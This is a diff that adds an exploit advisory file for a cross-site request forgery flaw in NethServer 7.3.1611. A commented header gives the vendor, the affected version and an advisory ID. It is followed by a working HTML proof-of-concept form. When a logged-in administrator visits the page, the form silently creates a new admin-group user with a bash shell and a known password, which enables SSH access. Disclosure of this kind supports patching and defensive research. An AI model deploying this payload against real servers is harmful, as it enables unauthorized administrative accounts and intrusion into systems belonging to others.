@@ -1,0 +1,58 @@
+<!--
+
+NethServer 7.3.1611 (create.json) CSRF Create User And Enable SSH Access
+
+
+Vendor: NethServer.org
+Product web page: https://www.nethserver.org
+Affected version: 7.3.1611-u1-x86_64
+
+Summary: NethServer is an operating system for the Linux
+enthusiast, designed for small offices and medium enterprises.
+It's simple, secure and flexible.
+
+Desc: The application interface allows users to perform certain
+actions via HTTP requests without performing any validity checks
+to verify the requests. This can be exploited to perform certain
+actions with administrative privileges if a logged-in user visits
+a malicious web site.
+
+Tested on: Kernel 3.10.0.-514.el7.x86_64 on an x86_64
+           CentOS Linux 7.3.1611 (Core)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5433
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5433.php
+
+
+16.08.2017
+
+-->
+
+
+HTML Decoded PoC:
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://172.19.0.195:980/en-US/Account/User/create.json" method="POST">
+      <input type="hidden" name="Account[User][create][username]" value="Blabla" />
+      <input type="hidden" name="Account[User][create][gecos]" value="Test1" />
+      <input type="hidden" name="Account[User][create][groups]" value="" />
+      <input type="hidden" name="Account[User][create][groups][1]" value="admin@zsl.lsz" />
+      <input type="hidden" name="Account[User][create][expires]" value="no" />
+      <input type="hidden" name="Account[User][create][shell]" value="/usr/libexec/openssh/sftp-server" />
+      <input type="hidden" name="Account[User][create][shell]" value="/bin/bash" />
+      <input type="hidden" name="Account[User][create][setPassword]" value="disabled" />
+      <input type="hidden" name="Account[User][create][setPassword]" value="enabled" />
+      <input type="hidden" name="Account[User][create][newPassword]" value="gi3fme$heLL!" />
+      <input type="hidden" name="Account[User][create][confirmNewPassword]" value="gi3fme$heLL!" />
+      <input type="hidden" name="Account[User][create][Submit]" value="Submit" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
